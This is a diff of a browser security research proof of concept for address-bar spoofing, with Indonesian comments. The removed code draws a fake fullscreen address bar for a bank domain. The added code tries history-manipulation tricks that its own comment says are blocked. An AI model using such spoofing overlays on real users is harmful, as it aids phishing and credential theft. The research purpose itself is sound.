@@ -1,32 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-<title>Research PoC - Fullscreen Overlay Spoof</title>
-</head>
 <body>
-<h3>PoC: Fullscreen + native dialog overlay</h3>
 <script>
 async function run() {
-  // 1. Masuk fullscreen, gambar address bar palsu di overlay
+  // 1. replaceState agar tampilan URL "bersih"
+  history.replaceState(null, "", "/");
+  // 2. Masuk fullscreen segera setelah gesture
   await document.documentElement.requestFullscreen();
-  const overlay = document.createElement("div");
-  overlay.style.cssText = "position:fixed;top:0;left:0;right:0;height:80px;" +
-    "background:#1a73e8;color:#fff;display:flex;align-items:center;padding:0 16px;" +
-    "font-family:sans-serif;z-index:9999";
-  overlay.innerHTML = "<span style='background:#fff;color:#333;padding:6px 24px;" +
-    "border-radius:20px'>https://bank.example.com</span>";
-  document.body.appendChild(overlay);
-
-  // 2. Trigger dialog native yang mungkin digambar di atas overlay,
-  //    membuka jendela ke desktop di belakangnya (cjual address bar asli)
-  setTimeout(() => {
-    const input = document.createElement("input");
-    input.type = "file";
-    input.onchange = () => document.exitFullscreen();
-    input.click();
-  }, 1500);
+  // 3. pushState dengan URL lain — beberapa build memperlihatkan
+  //    state lama di URL bar saat navigasi pembatalan (back) cepat
+  history.pushState(null, "", "https://www.google.com/does-not-work-directly");
+  // pushState cross-origin MEMANG diblokir — tes sebenarnya:
+  // buka popup same-origin, dari popup memanipulasi opener.history saat dialog aktif
 }
 </script>
-<button onclick="run()">Start fullscreen PoC</button>
+<button onclick="run()">Run</button>
 </body>
 </html>
